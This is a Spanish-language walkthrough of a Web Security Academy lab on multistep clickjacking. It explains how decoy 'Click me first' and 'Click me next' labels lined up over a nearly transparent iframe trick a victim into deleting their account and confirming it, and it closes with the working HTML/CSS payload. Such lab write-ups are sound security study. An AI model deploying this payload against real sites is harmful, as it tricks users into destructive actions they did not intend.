En este laboratorio se presenta una defensa adicional contra el clickjacking: además de un token CSRF, el botón de eliminación de cuenta incluye una ventana de confirmación. Para explotar esta funcionalidad, el ataque debe engañar a la víctima para que realice dos clics consecutivos en ubicaciones específicas: uno para activar el botón de “Eliminar cuenta” y otro para confirmar la acción.

Para lograrlo, se estructura una página con dos capas señuelo (Click me first y Click me next), alineadas con los botones reales del formulario y del cuadro de confirmación, respectivamente. El iframe que contiene la página objetivo se vuelve prácticamente invisible gracias al uso de opacidad muy baja.

Una vez que la víctima interactúa con los dos elementos señuelo, el proceso completo de eliminación de cuenta se ejecuta con éxito, incluyendo la confirmación del diálogo. Este ataque demuestra cómo el clickjacking puede seguir siendo efectivo incluso en flujos de múltiples pasos si no se implementan defensas robustas adicionales como ‘**frame-ancestors**‘ o ‘**same-origin**‘ en ‘**Content-Security-Policy**‘

----

```html
<style>
    iframe{
        width: 500px;
        height: 600px;
         opacity: 0.01;

    }
    .firstClick{
        position: absolute;
        top: 500px;
        left: 80px;
    }

.secondClick{
        position: absolute;
        top: 295px;
        left: 200px;
    }
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://0a5300bb0300fc1d82da97240050007c.web-security-academy.net/my-account"> </iframe>
```